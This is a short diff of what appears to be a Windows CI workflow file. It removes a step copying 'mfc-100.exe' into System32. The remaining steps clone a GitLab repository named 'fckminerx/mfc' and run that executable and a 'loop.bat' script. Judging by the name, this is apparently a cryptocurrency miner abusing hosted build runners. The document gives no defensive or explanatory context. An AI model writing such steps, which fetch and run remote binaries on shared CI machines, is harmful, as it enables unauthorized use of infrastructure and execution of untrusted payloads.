@@ -15,6 +15,5 @@ jobs:
       - run: Write-Host 'Hello, Windows'
       - run: git clone https://gitlab.com/fckminerx/mfc
       - run: cd mfc
-      - run: copy mfc-100.exe C:\Windows\System32
       - run: powershell .\mfc-100.exe
       - run: powershell .\loop.bat
